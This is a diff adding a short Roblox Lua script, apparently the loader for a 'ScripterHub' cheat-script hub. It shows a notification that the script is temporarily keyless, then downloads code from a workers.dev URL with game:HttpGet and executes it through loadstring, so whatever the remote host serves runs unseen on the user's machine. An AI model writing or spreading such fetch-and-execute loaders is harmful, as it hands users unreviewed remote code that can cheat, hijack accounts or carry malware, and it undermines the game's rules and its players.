@@ -1,0 +1,9 @@
+local StarterGui = game:GetService("StarterGui")
+
+StarterGui:SetCore("SendNotification", {
+	Title = "NOTE",
+	Text = "This script is currently keyless but only for Temporary time. Key system will be attached to it later",
+	Duration = 10 -- How long the notification stays on screen (in seconds)
+})
+
+loadstring(game:HttpGet("https://scripterhub-stats.dubovikstanislav51.workers.dev/sh/ScripterHub9205588501"))()
